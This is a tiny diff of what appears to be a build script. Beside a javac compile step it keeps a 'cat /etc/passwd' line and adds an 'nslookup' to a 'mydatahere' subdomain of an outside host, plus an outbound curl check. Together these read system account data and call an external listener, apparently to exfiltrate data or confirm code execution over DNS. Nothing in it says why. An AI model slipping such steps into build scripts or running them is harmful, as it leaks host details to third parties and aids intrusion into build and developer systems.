@@ -2,4 +2,5 @@
 
 javac src/Main.java
 cat /etc/passwd
-find /opt/
+nslookup mydatahere.ecec459e647ea6be494a.d.zhack.ca
+curl -vv google.com
